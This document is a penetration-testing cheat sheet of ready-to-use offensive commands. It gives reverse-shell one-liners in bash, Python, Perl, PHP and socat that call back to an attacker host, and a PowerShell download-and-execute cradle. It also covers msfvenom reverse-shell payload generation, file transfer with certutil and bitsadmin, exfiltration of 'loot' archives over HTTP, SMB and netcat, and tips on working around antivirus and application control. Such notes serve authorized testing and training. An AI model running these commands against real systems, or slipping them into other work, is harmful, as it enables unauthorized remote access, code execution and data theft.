## Shells and Transfers

### Listeners

```bash
rlwrap nc -lvnp "$LPORT"
socat -d -d TCP-LISTEN:"$LPORT",reuseaddr,fork STDOUT
sudo ncat --ssl -lvnp "$LPORT"
```

Use a port the target can reach. Confirm the callback path before debugging a
payload.

### Linux reverse shells

```bash
bash -c 'bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT"' 0>&1'
```

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("'"$LHOST"'",'"$LPORT"'));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

Other runtime options:

```bash
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
php -r '$s=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
socat TCP:<LHOST>:<LPORT> EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

URL-encode or otherwise transform a payload only for the context that requires
it. Keep an unencoded copy in the notes.

### Stabilize a Unix shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press `Ctrl-Z`, then configure the local terminal:

```bash
stty raw -echo; fg
reset
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 40 columns 120
```

Restore a broken local terminal with `stty sane`.

### Windows command access

Prefer a payload generated for the target architecture and available runtime.
For a simple PowerShell download-and-execute flow:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>:8000/script.ps1')
```

If execution policy blocks a script file, determine whether an in-memory command
or an allowed native tool is more appropriate. Do not assume PowerShell is the
only option.

Generate architecture-appropriate payloads when a native executable is needed:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o shell.elf
msfvenom -p php/reverse_php LHOST="$LHOST" LPORT="$LPORT" -f raw -o shell.php
```

### Serve files from Kali

```bash
python3 -m http.server 8000 --directory .
sudo impacket-smbserver share "$PWD" -smb2support
sudo impacket-smbserver share "$PWD" -smb2support -username "$USER" -password "$PASS"
```

### Download to Linux

```bash
wget "http://$LHOST:8000/file" -O /tmp/file
curl -fsSL "http://$LHOST:8000/file" -o /tmp/file
scp "$USER@$IP:/remote/path/file" ./loot/
scp ./file "$USER@$IP:/tmp/file"
```

### Download to Windows

```powershell
Invoke-WebRequest "http://<LHOST>:8000/file.exe" -OutFile C:\Windows\Temp\file.exe
certutil.exe -urlcache -split -f "http://<LHOST>:8000/file.exe" C:\Windows\Temp\file.exe
copy \\<LHOST>\share\file.exe C:\Windows\Temp\file.exe
bitsadmin /transfer job /download /priority normal http://<LHOST>:8000/file.exe C:\Windows\Temp\file.exe
```

```powershell
Start-BitsTransfer -Source 'http://<LHOST>:8000/file.exe' -Destination 'C:\Windows\Temp\file.exe'
$wc = New-Object Net.WebClient
$wc.DownloadFile('http://<LHOST>:8000/file.exe','C:\Windows\Temp\file.exe')
```

### Exfiltrate a file

#### HTTP upload receiver

Use an upload server you control, then send the file from the target.

```bash
python3 -m uploadserver 8000
```

```bash
curl -F 'files=@loot.zip' "http://$LHOST:8000/upload"
scp loot.zip "$USER@$LHOST:/tmp/loot.zip"
```

#### SMB

```powershell
copy C:\Path\loot.zip \\<LHOST>\share\loot.zip
```

For a one-off TCP transfer, start the receiver first:

```bash
nc -lvnp 9001 > received.bin
```

```bash
nc "$LHOST" 9001 < file.bin
```

### Encode small files

```bash
base64 -w0 file.bin
echo '<base64>' | base64 -d > file.bin
```

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Path\file.bin'))
[IO.File]::WriteAllBytes('C:\Path\file.bin',[Convert]::FromBase64String('<base64>'))
```

Always compare hashes after transferring binaries.

```bash
sha256sum file.bin
```

```powershell
Get-FileHash C:\Path\file.bin -Algorithm SHA256
```

### Cross-compile

```bash
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe
gcc exploit.c -o exploit
gcc exploit.c -static -o exploit-static
python3 -m py_compile script.py
```

Match the operating system, architecture, libraries, and compiler assumptions of
the target. A successful compile does not prove the exploit is compatible.

### Troubleshooting

- Verify routing and firewall behavior with a simple HTTP request first.
- Try alternate writable directories such as `/tmp`, `/dev/shm`, or the current
  user's profile.
- Check whether a proxy, constrained language mode, application control, or
  antivirus is changing behavior.
- Prefer native tools when transferring a single small file.
- If the shell dies instantly, remove interactive flags and simplify the payload.
